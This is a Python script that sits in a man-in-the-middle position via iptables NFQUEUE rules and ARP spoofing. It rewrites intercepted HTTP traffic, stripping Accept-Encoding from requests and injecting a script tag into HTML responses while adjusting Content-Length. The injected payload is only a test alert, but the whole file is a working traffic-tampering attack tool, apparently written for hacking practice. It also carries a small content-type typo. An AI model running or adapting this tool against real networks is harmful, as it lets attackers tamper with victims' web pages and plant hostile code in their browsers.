#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import re
# First:
# iptables -I FORWARD -j NFQUEUE --queue-num 0  --> for mitm and with arp_spoof.py
# iptables -I OUTPUT -j NFQUEUE --queue-num 0   --> own computer
# iptables -I INPUT -j NFQUEUE --queue-num 0    --> own computer
# iptables flush  --> back to normal 


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    # Converting packet to a scapy packet
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):      
        # try:                                               python3 
            # load = scapy_packet[scapy.Raw].load.decode()   python3 
            load = scapy_packet[scapy.Raw].load  
            if scapy_packet[scapy.TCP].dport == 80:      
                print("[+] Request")
                # Delete Accept-Encoding and its content
                load = re.sub("Accept-Encoding:.*?\\r\\n","", load)
            elif scapy_packet[scapy.TCP].sport == 80:
                print("[+] Response")
                injection_code = "<script>alert('test');</script>"
                load = load.replace("</head>", injection_code + "</head>")
                # The new load make it content-length bigger so we need to change it
                content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
                if content_length_search and "txt/html" in load:
                    print("Old content_length: " + str(content_length_search.group(1)))
                    content_length = content_length_search.group(1)
                    new_content_length = int(content_length) + len(injection_code)
                    load = load.replace(content_length, str(new_content_length))
                    print("New content_length: " + str(new_content_length))
            if load != scapy_packet[scapy.Raw].load:
                new_packet = set_load(scapy_packet, load)
                # packet.set_payload(bytes(new_packet))     python3
                packet.set_payload(str(new_packet))         
        # except UnicodeDecodeError python3
            # pass                  python3

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
